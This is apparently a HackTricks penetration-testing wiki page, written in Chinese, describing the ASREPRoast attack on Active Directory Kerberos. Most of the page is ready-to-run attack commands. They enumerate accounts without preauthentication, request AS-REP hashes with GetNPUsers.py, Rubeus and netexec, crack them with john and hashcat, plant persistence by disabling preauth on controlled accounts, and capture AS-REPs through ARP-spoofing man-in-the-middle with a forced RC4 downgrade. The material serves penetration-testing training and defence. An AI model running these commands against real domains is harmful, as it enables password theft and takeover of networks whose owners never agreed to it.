# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast 是一种利用缺少 **Kerberos pre-authentication required attribute** 的用户的安全攻击。这个漏洞允许攻击者向 Domain Controller (DC) 请求针对某个用户的认证，而无需该用户的密码。DC 随后会返回一个使用该用户密码派生密钥加密的消息，攻击者可以将其离线破解以发现用户密码。

The main requirements for this attack are:

- **Lack of Kerberos pre-authentication**: 目标用户必须未启用此安全功能。
- **Connection to the Domain Controller (DC)**: 攻击者需要访问 DC 才能发送请求并接收加密消息。
- **Optional domain account**: 拥有域帐户可以让攻击者通过 LDAP 查询更高效地识别易受攻击的用户。没有此类帐户时，攻击者必须猜测用户名。

#### 枚举易受攻击的用户（需要域凭证）
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### 请求 AS_REP 消息
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus 会生成一个 4768，其加密类型为 0x17，preauth 类型为 0。

#### 快速单行命令 (Linux)

- 先枚举潜在目标（例如，来自 leaked build paths），使用 Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- 即使密码为 **空**，也可以拉取单个用户的 AS-REP，使用 `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast`（netexec 还会打印 LDAP signing/channel binding posture）。
- 使用 `hashcat out.asreproast /path/rockyou.txt` 进行破解 – 它会自动识别 **-m 18200**（etype 23），适用于 AS-REP roast hashes。

### 破解
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

强制对你拥有 **GenericAll** 权限（或写入属性权限）的用户不需要 **preauth**：
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast 无凭证

攻击者可以利用 man-in-the-middle 位置在网络传输过程中捕获 AS-REP 数据包，而无需依赖 Kerberos pre-authentication 被禁用。因此，它适用于 VLAN 上的所有用户。\  
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 允许我们做到这一点。此外，该工具通过更改 Kerberos negotiation 强制客户端工作站使用 RC4。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 参考资料

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
